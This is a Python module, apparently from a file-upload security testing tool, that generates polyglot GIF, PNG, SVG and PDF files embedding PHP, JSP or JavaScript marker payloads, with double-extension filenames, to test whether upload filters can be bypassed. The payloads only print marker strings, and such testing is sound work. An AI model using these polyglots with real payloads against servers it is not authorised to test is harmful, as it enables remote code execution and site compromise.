"""Polyglot seeds: valid files that embed executable payloads.

Each polyglot passes content-type validation for its declared format while
carrying a secondary payload (PHP, JSP, JS) that executes if the server
re-interprets the file. These bypass upload filters that check magic bytes
but not the full file structure.
"""

from __future__ import annotations

import zlib

from ._seeds import _PNG


def _polyglot_gifar_php() -> bytes:
    """GIF87a image with PHP payload in the GIF comment extension."""
    payload = b"<?php echo 'POLYGLOT_GIFAR_PHP'; ?>"
    comment_ext = b"\x21\xfe" + bytes([len(payload)]) + payload + b"\x00"
    return (
        b"GIF87a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff"
        + comment_ext
        + b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"
    )


def _polyglot_gifar_jsp() -> bytes:
    """GIF87a image with JSP payload in the GIF comment extension."""
    payload = b"<%= \"POLYGLOT_GIFAR_JSP\" %>"
    comment_ext = b"\x21\xfe" + bytes([len(payload)]) + payload + b"\x00"
    return (
        b"GIF87a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff"
        + comment_ext
        + b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"
    )


def _polyglot_png_php() -> bytes:
    """Valid PNG with PHP payload in a tEXt chunk (parsers skip unknown text)."""
    payload = b"<?php echo 'POLYGLOT_PNG_PHP'; ?>"
    keyword = b"Comment\x00"
    text_data = keyword + payload
    text_crc = zlib.crc32(b"tEXt" + text_data) & 0xFFFFFFFF
    text_chunk = (
        len(text_data).to_bytes(4, "big")
        + b"tEXt"
        + text_data
        + text_crc.to_bytes(4, "big")
    )
    ihdr = _PNG[8:8 + 25]
    idat_start = _PNG.index(b"IDAT") - 4
    idat_end = _PNG.index(b"IEND") - 4
    idat = _PNG[idat_start:idat_end]
    iend = _PNG[idat_end:]
    return b"\x89PNG\r\n\x1a\n" + ihdr + text_chunk + idat + iend


def _polyglot_svg_js() -> bytes:
    """SVG image with embedded JavaScript onload handler."""
    return (
        b'<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1" '
        b'onload="document.write(\'POLYGLOT_SVG_JS\')">'
        b'<rect width="1" height="1"/>'
        b'<script type="text/javascript">document.write("POLYGLOT_SVG_SCRIPT")</script>'
        b'</svg>'
    )


def _polyglot_pdf_js() -> bytes:
    """PDF with embedded JavaScript action (executes in Adobe Reader)."""
    return (
        b"%PDF-1.4\n"
        b"1 0 obj<</Type/Catalog/Pages 2 0 R/OpenAction 4 0 R>>endobj\n"
        b"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n"
        b"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 3 3]>>endobj\n"
        b"4 0 obj<</Type/Action/S/JavaScript/JS(app.alert('POLYGLOT_PDF_JS'))>>endobj\n"
        b"xref\n0 5\n"
        b"0000000000 65535 f \n"
        b"0000000009 00000 n \n"
        b"0000000068 00000 n \n"
        b"0000000117 00000 n \n"
        b"0000000174 00000 n \n"
        b"trailer<</Size 5/Root 1 0 R>>\n"
        b"startxref\n252\n%%EOF\n"
    )


_POLYGLOTS: list[tuple[str, str, bytes]] = [
    ("gif", "gifar_php.gif.php", _polyglot_gifar_php()),
    ("gif", "gifar_jsp.gif.jsp", _polyglot_gifar_jsp()),
    ("png", "png_php.png.php", _polyglot_png_php()),
    ("svg", "svg_js.svg", _polyglot_svg_js()),
    ("pdf", "pdf_js.pdf", _polyglot_pdf_js()),
]


def polyglot_seeds(fmt: str = "") -> list[tuple[str, str, bytes]]:
    """Return polyglot seeds, optionally filtered by base format.

    Each entry is (base_format, suggested_filename, raw_bytes).
    """
    fmt = (fmt or "").lower().lstrip(".")
    if fmt in ("jpg", "jpe"):
        fmt = "jpeg"
    if not fmt:
        return list(_POLYGLOTS)
    return [(f, n, b) for f, n, b in _POLYGLOTS if f == fmt]
